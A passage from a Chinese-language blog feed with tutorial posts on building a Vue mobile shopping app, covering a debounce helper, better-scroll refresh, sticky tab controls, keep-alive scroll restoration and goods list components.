class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">imageLoad() &#123;</span><br><span class="line">  <span class="keyword">this</span>.$bus.$emit(<span class="string">'itemImageLoad'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，让我们回到scroll.vue中，为了避免图片数据已经过来而这时候的scroll组件还未创建完成，从而导致该scroll实例的方法调用失败。所以我们首先要判断该组件methods中的方法在执行的时候scroll是否已经创建，如果创建的话再去调用其内部方法（利用&amp;&amp;逻辑与进行判断）如下代码所示</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line">     <span class="comment">//跳转某位置</span></span><br><span class="line">     scrollTo(x,y,time = <span class="number">666</span>) &#123;</span><br><span class="line">       <span class="keyword">this</span>.bs &amp;&amp; <span class="keyword">this</span>.bs.scrollTo(x,y,time)</span><br><span class="line">     &#125;,</span><br><span class="line">     <span class="comment">//刷新</span></span><br><span class="line">     refresh() &#123;</span><br><span class="line">       <span class="keyword">this</span>.bs &amp;&amp; <span class="keyword">this</span>.bs.refresh()</span><br><span class="line">     &#125;,</span><br><span class="line">     <span class="comment">//完成底部滚动</span></span><br><span class="line">     finishPullUp() &#123;</span><br><span class="line">       <span class="keyword">this</span>.bs &amp;&amp; <span class="keyword">this</span>.bs.finishPullUp()</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>然后在home组件中使用该事件（这里是在mounted中去调用该方法，为什么不在created中呢，因为在这个时候的各个组件还未创建完成，可能会导致执行失败）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> mounted() &#123;</span><br><span class="line"><span class="keyword">this</span>.$bus.$on(<span class="string">'itemImageLoad'</span>, () =&gt; &#123;</span><br><span class="line">     <span class="keyword">this</span>.$refs.scroll.refresh()</span><br><span class="line">&#125;)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这样，在每次的图片加载后页面便会刷新一次</p></li></ol><h2 id="debounce-防抖"><a href="#debounce-防抖" class="headerlink" title="debounce(防抖)"></a>debounce(防抖)</h2><p>这里对上述操作做一个防抖处理（JS高级→提升性能），因为每次加载一张图片就要做一次bs刷新，是不是有点浪费性能，我们能不能在加载一定数量的图片后再刷新？答案是肯定的，我们首先要封装一个防抖函数debounce(func,delay)，函数的思路是提供两个参数，第一个参数是执行的函数，第二个参数便是规定的时间（即检测该函数在该时间内是否又需要执行一次，是则重置时间），我们在common文件夹下新建一个ultis.js文件，代码如下（你需要掌握以下js原生函数setTimeOut()、clearTimeOut()、apply()）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">func, delay</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> timer = <span class="literal">null</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (timer) clearTimeout(timer)</span><br><span class="line">    timer = setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      func.apply(<span class="keyword">this</span>, args)</span><br><span class="line">    &#125;, delay)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数的思路"><a href="#函数的思路" class="headerlink" title="函数的思路"></a>函数的思路</h3><p>首先你要定义一个变量接收该函数返回值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> func = debounce(func, delay)</span><br><span class="line">func(args1,args2) <span class="comment">//执行</span></span><br></pre></td></tr></table></figure><p>然后该函数执行思路如下</p><ol><li>传入一个需要的执行函数func（注意不要加()，因为需要的是一个变量，不然你传进去的就是函数的返回值了）和一个时间delay</li><li>内部函数timer初始值为null</li><li>返回一个函数，也就是上面的func，同时使用解构赋值（…args）将funcd参数接收</li><li>返回的函数内部进行判断，设置一个你开始赋予delay的定时器，定时器启动，在该时间后执行你传入的函数（func.apply(this, args)），如若这时候你又需要执行一次该函数，那么这个时候timer就会有值，从而执行clearTimeOut函数清除定时器,重新开始计时，如此反复下去进行判断，直到超过该时间或是不再有重复的执行函数进来</li><li>注意：该防抖只是防止频繁执行，并不保证频繁执行次数会化为一次，如果超过该时间，则会增加一次执行次数</li></ol><h3 id="项目的使用"><a href="#项目的使用" class="headerlink" title="项目的使用"></a>项目的使用</h3><p>首先导入该模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//防抖操作</span></span><br><span class="line"><span class="keyword">import</span> &#123;debounce&#125; <span class="keyword">from</span> <span class="string">'common/utils.js'</span></span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mounted() &#123;</span><br><span class="line">  <span class="keyword">const</span> refresh = debounce(<span class="keyword">this</span>.$refs.scroll.refresh, <span class="number">500</span>) <span class="comment">//注意不要加括号，否则传入的是函数返回值</span></span><br><span class="line">  <span class="keyword">this</span>.$bus.$on(<span class="string">'itemImageLoad'</span>, () =&gt; &#123;</span><br><span class="line">    refresh()</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="scroll参数函数优化"><a href="#scroll参数函数优化" class="headerlink" title="scroll参数函数优化"></a>scroll参数函数优化</h2><p>使用if进行判断，判断设置参数是否符合函数的执行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mounted() &#123;</span><br><span class="line">  <span class="keyword">this</span>.bs = <span class="keyword">new</span> BScroll(<span class="keyword">this</span>.$refs.wrapper, &#123;</span><br><span class="line">    click: <span class="literal">true</span>,</span><br><span class="line">    probeType: <span class="keyword">this</span>.probeType,</span><br><span class="line">    pullUpLoad: <span class="keyword">this</span>.pullUpLoad,</span><br><span class="line">    observeDOM: <span class="literal">true</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">//滚动过程实时监听</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">this</span>.probeType === <span class="number">2</span> || <span class="keyword">this</span>.probeType === <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">this</span>.bs.on(<span class="string">"scroll"</span>, (position) =&gt; &#123;</span><br><span class="line">      <span class="keyword">this</span>.$emit(<span class="string">'scroll'</span>, position)</span><br><span class="line">      </span><br><span class="line">    &#125;)        </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//监听滚动到底部</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">this</span>.pullUpLoad === <span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">this</span>.bs.on(<span class="string">"pullingUp"</span>, ()=&gt; &#123;</span><br><span class="line">      <span class="keyword">this</span>.$emit(<span class="string">'pullingUp'</span>)</span><br><span class="line">    &#125;)        </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="吸顶效果"><a href="#吸顶效果" class="headerlink" title="吸顶效果"></a>吸顶效果</h2><p>项目进行到这里，你会发现，之前给tab-control设置的css吸顶效果失效了，也就是<code>position:sticky</code>失效了，所以这里我们要用js的方式实现吸顶效果，思路如下</p><ol><li><p>按照图片加载速度，选择加载最久的哪个图片进行监听load事件（这里选择swipeItem），发送该事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img :src&#x3D;&quot;item.image&quot; alt&#x3D;&quot;&quot; @load&#x3D;&quot;imgLoad&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line">  imgLoad() &#123;</span><br><span class="line">    <span class="keyword">this</span>.$emit(<span class="string">'swipeImgLoad'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Home绑定该事件，当监听到该图片加载完后，得到TabControl以上的高度（$el.offsetTop）并存储在data中（tabOffsetTop）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//吸顶</span></span><br><span class="line">swipeImgLoad() &#123;</span><br><span class="line">  <span class="keyword">this</span>.tabOffset = <span class="keyword">this</span>.$refs.tabControl2.$el.offsetTop</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在监听滚动事件（contentScroll())中监听当前位置是否与data中tabOffsetTop的值一致，一致则将data中isTabFixed的值改为true（自己添加，默认为false）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//监听滚动</span></span><br><span class="line">contentScroll(position) &#123;</span><br><span class="line">  <span class="keyword">this</span>.backTopShow = (-position.y) &gt; <span class="number">1000</span></span><br><span class="line">  <span class="keyword">this</span>.isTabfixed = (-position.y) &gt; <span class="keyword">this</span>.tabOffset <span class="comment">//判断是否需要吸顶</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>吸顶</p><ol><li>根据属性动态改变tabControl的样式（css:fixed，<strong>行不通</strong>，因为它处在better-scroll中，better-scroll使用的是css的transfrom属性，没有效果）</li><li>复制一份tab-control。将其与scroll中的content脱离，同时将css属性设置为<code>position:relative</code>和<code>index:10</code>，以显示在顶部</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> &lt;div id&#x3D;&quot;home&quot;&gt;</span><br><span class="line">   &lt;nav-bar class&#x3D;&quot;home-nav&quot;&gt;&lt;div slot&#x3D;&quot;center&quot;&gt;购物街&lt;&#x2F;div&gt;&lt;&#x2F;nav-bar&gt;</span><br><span class="line">   &lt;tab-control </span><br><span class="line">     :titles&#x3D;&quot;[&#39;流行&#39;, &#39;新款&#39;, &#39;精选&#39;]&quot; </span><br><span class="line">     class&#x3D;&quot;tab-control&quot; </span><br><span class="line">     @tabClick&#x3D;&quot;tabClick&quot;</span><br><span class="line">     ref&#x3D;&quot;tabControl1&quot;</span><br><span class="line">     v-show&#x3D;&quot;isTabfixed&quot;&gt;&lt;&#x2F;tab-control&gt;</span><br><span class="line">   &lt;scroll </span><br><span class="line">   class&#x3D;&#39;wrapper&#39; </span><br><span class="line">   ref&#x3D;&quot;scroll&quot; </span><br><span class="line">   :probe-type&#x3D;&quot;3&quot; </span><br><span class="line">   @scroll&#x3D;&quot;contentScroll&quot;</span><br><span class="line">   :pull-up-load&#x3D;&quot;true&quot;</span><br><span class="line">   @pullingUp&#x3D;&quot;pulling&quot;&gt;</span><br><span class="line">。。。</span><br><span class="line">   &lt;&#x2F;scroll&gt;</span><br><span class="line">   &lt;back-top @click.native&#x3D;&quot;backTopClick&quot; v-show&#x3D;&quot;backTopShow&quot;&gt;&lt;&#x2F;back-top&gt;</span><br><span class="line"> &lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure></li><li><p>使用v-show决定脱离scroll的tab-control是否显示（v-show=”isTabFixed”）</p></li><li><p>解决拖动过程中两个tab-control选项不同的问题：将其ref分别改为tabControl1和tabControl2，并在tabClick事件中将两个的currentIndex改为当前选项index</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//首页数据处理</span></span><br><span class="line">tabClick(index) &#123;</span><br><span class="line">  <span class="keyword">switch</span> (index) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">this</span>.currentType = <span class="string">'pop'</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">this</span>.currentType = <span class="string">'new'</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">this</span>.currentType = <span class="string">'sell'</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>.$refs.tabControl1.currentIndex = index</span><br><span class="line">  <span class="keyword">this</span>.$refs.tabControl2.currentIndex = index</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="跳转保留首页状态"><a href="#跳转保留首页状态" class="headerlink" title="跳转保留首页状态"></a>跳转保留首页状态</h2><p>核心思路：使用keep-alive标签解决当前页面状态，以及scroll.y保留scroll当前位置</p><p>在App.vue中使用keep-alive标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">  &lt;keep-alive&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;&#x2F;router-view&gt;      </span><br><span class="line">  &lt;&#x2F;keep-alive&gt;   </span><br><span class="line">  &lt;main-tab-bar&gt;&lt;&#x2F;main-tab-bar&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>封装scroll的y位置函数（methods中）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">toY() &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.bs ? <span class="keyword">this</span>.bs.y : <span class="number">0</span></span><br><span class="line">d&#125;</span><br></pre></td></tr></table></figure><p>Home组件中，在组件非活跃状态（即跳转其它路由）时保留当前位置（data声明saveY变量接收该位置）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">deactivated() &#123;</span><br><span class="line">   <span class="keyword">this</span>.saveY = <span class="keyword">this</span>.$refs.scroll.toY()</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>在组件活跃（即路由恢复至首页）时，跳转之前保留的位置信息并再次刷新（避免异常卡顿）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">activated() &#123;</span><br><span class="line">  <span class="keyword">this</span>.$refs.scroll.scrollTo(<span class="number">0</span>,<span class="keyword">this</span>.saveY,<span class="number">1000</span>)</span><br><span class="line">  <span class="keyword">this</span>.$refs.scroll.refresh()</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><blockquote><p>当然，这一切，在better-scroll2.0是不需要做的，它已经帮我们做好了，hiahiahia</p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue移动端商城 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3.首页中</title>
      <link href="/2021/03/02/3.%E9%A6%96%E9%A1%B5%E4%B8%AD/"/>
      <url>/2021/03/02/3.%E9%A6%96%E9%A1%B5%E4%B8%AD/</url>
      
        <content type="html"><![CDATA[<h2 id="设计商品的数据结构"><a href="#设计商品的数据结构" class="headerlink" title="设计商品的数据结构"></a>设计商品的数据结构</h2><p>在这里，首页数据是根据TabControl切换而得到的，而每次上拉加载都刷新一定数量的数据，所以根据三个切换按钮在里面又定义了三个对象，而每次上拉加载都定义为加一页（默认第一页），所以定义page用来存储当前页数信息，用list来存储到当前页加载到的商品数量</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">goods: &#123;</span><br><span class="line">  <span class="string">'pop'</span>: &#123;<span class="attr">page</span>:<span class="number">0</span>, <span class="attr">list</span>:[]&#125;,</span><br><span class="line">  <span class="string">'new'</span>: &#123;<span class="attr">page</span>:<span class="number">0</span>, <span class="attr">list</span>:[]&#125;,</span><br><span class="line">  <span class="string">'sell'</span>: &#123;<span class="attr">page</span>:<span class="number">0</span>, <span class="attr">list</span>:[]&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="首页数据的请求和封装"><a href="#首页数据的请求和封装" class="headerlink" title="首页数据的请求和封装"></a>首页数据的请求和封装</h2><p>ntework里的home.js同第一个网络请求的函数一样，再次定义另外一个，获得商品数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">getHomeGoods</span>(<span class="params">type,page</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> request(&#123;</span><br><span class="line">    <span class="comment">//接口已修改</span></span><br><span class="line">    url: <span class="string">'/api/h8/home/data'</span>,</span><br><span class="line">    params: &#123;</span><br><span class="line">      type,</span><br><span class="line">      page</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在home.vue调用该函数，并将其封装成方法，因为我们在网络请求后会做进一步的处理，所以我们用同名的函数将其封装起来，并在create()中调用这些网络请求以及具体的实现方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">created() &#123;</span><br><span class="line">  <span class="keyword">this</span>.getHomeMultidata()</span><br><span class="line">  <span class="keyword">this</span>.getHomeGoods(<span class="string">'pop'</span>)</span><br><span class="line">  <span class="keyword">this</span>.getHomeGoods(<span class="string">'new'</span>)</span><br><span class="line">  <span class="keyword">this</span>.getHomeGoods(<span class="string">'sell'</span>)</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line">  <span class="comment">//网络分析相关方法</span></span><br><span class="line">  getHomeMultidata() &#123;</span><br><span class="line">    getHomeMultidata().then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.banners = res.data.banner.list</span><br><span class="line">      <span class="keyword">this</span>.recommends = res.data.recommend.list</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line">  getHomeGoods(type) &#123;</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">this</span>.goods[type].page + <span class="number">1</span></span><br><span class="line">    getHomeGoods(type, page).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.goods[type].list.push(...res.data.list)</span><br><span class="line">      <span class="keyword">this</span>.goods[type].page ++</span><br><span class="line">    &#125;)         </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="商品展示"><a href="#商品展示" class="headerlink" title="商品展示"></a>商品展示</h2><p>因为涉及到该项目的业务功能（好几个页面会用到该组件），所以在components中的content中新建goods文件夹，新建两个vue文件GoodsList以及GoodsListItem，一个用来描述单个商品的详细样式，另外一个用来展示整体商品的样式</p><p>GoodsList.vue</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;goods-list&quot;&gt;</span><br><span class="line">    &lt;goods-list-item v-for&#x3D;&quot;item in goods&quot; :goods-item&#x3D;&quot;item&quot;&gt;&lt;&#x2F;goods-list-item&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  import GoodsListItem from &#39;.&#x2F;GoodsListItem.vue&#39;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name: &#39;GoodsList&#39;,</span><br><span class="line">    props: &#123;</span><br><span class="line">      goods: &#123;</span><br><span class="line">        type: Array,</span><br><span class="line">        default() &#123;</span><br><span class="line">          return []</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    components: &#123;</span><br><span class="line">      GoodsListItem</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">  .goods-list &#123;</span><br><span class="line">    display: flex;</span><br><span class="line">    padding: 2px;  </span><br><span class="line"></span><br><span class="line">     &#x2F;* 包裹 *&#x2F;</span><br><span class="line">     flex-wrap: wrap;</span><br><span class="line">     justify-content: space-around;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><p>GoodsListItem.vue</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;goods-list-item&quot;&gt;</span><br><span class="line">    &lt;img :src&#x3D;&quot;goodsItem.show.img&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;goods-info&quot;&gt;</span><br><span class="line">      &lt;p&gt;&#123;&#123;goodsItem.title&#125;&#125;&lt;&#x2F;p&gt;</span><br><span class="line">      &lt;span class&#x3D;&quot;price&quot;&gt;&#123;&#123;goodsItem.price&#125;&#125;&lt;&#x2F;span&gt;</span><br><span class="line">      &lt;span class&#x3D;&quot;collect&quot;&gt;&#123;&#123;goodsItem.cfav&#125;&#125;&lt;&#x2F;span&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#39;GoodsListItem&#39;,</span><br><span class="line">  props: &#123;</span><br><span class="line">    goodsItem: &#123;</span><br><span class="line">      type: Object,</span><br><span class="line">      default() &#123;</span><br><span class="line">        return &#123;&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  components: &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">  .goods-list-item &#123;</span><br><span class="line">    position: relative;</span><br><span class="line">    padding-bottom: 40px;</span><br><span class="line">    width: 48%;    </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .goods-list-item img &#123;</span><br><span class="line">    width: 100%;</span><br><span class="line">    border-radius: 5px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .goods-info &#123;</span><br><span class="line">    position: absolute;</span><br><span class="line">    left: 0;</span><br><span class="line">    right: 0;</span><br><span class="line">    bottom: 5px;</span><br><span class="line">    overflow: hidden;</span><br><span class="line">    text-align: center;</span><br><span class="line">    font-size: 12px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .goods-info p &#123;</span><br><span class="line">    overflow: hidden;</span><br><span class="line">    &#x2F;*  显示省略符号来代表被修剪的文本 *&#x2F;</span><br><span class="line">    text-overflow: ellipsis;</span><br><span class="line">    &#x2F;* 文本不换行 *&#x2F;</span><br><span class="line">    white-space: nowrap;</span><br><span class="line">    margin-bottom: 3px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .goods-info .price &#123;</span><br><span class="line">    color: var(--color-high-text);</span><br><span class="line">    margin-right: 20px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .goods-info .collect &#123;</span><br><span class="line">    position: relative;</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  .goods-info .collect::before &#123;</span><br><span class="line">    content: &#39;&#39;;</span><br><span class="line">    position: absolute;</span><br><span class="line">    left: -15px;</span><br><span class="line">    top: -1px;</span><br><span class="line">    width: 14px;</span><br><span class="line">    height: 14px;</span><br><span class="line">    background: url(&quot;~assets&#x2F;img&#x2F;common&#x2F;collect.svg&quot;) 0 0&#x2F;14px 14px;</span><br><span class="line">  &#125;  </span><br><span 